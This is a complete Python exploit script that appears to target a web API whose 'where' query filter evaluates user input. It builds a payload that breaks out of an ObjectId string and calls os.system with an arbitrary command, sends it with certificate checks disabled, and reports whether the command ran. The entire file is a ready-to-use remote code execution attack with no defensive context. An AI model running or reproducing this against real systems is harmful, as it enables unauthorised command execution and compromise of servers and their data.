#!/usr/bin/env python3

import argparse
import requests

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        help="Target URL (where you can use the 'where' filter), e.g. http://example.com/people",
        required=True,
    )
    parser.add_argument(
        "-c",
        "--command",
        help="System command to execute (shouldn't contain quotes)",
        required=True,
    )
    args = parser.parse_args()
    return args


def build_payload(cmd):
    payload = f'ObjectId("507f1f77bcf86cd799439011\') and __import__(\\"os\\").system(\'{cmd}")'
    return payload


if __name__ == "__main__":
    args = parse_args()
    payload = build_payload(args.command)
    params = {"where": f"_id == {payload}"}
    print("[*] Sending payload")
    r = requests.get(args.url, verify=False, params=params)
    if r.status_code == 200:
        print("[+] Command executed")
    else:
        print(f"[-] An error occured:\n {r.text}")
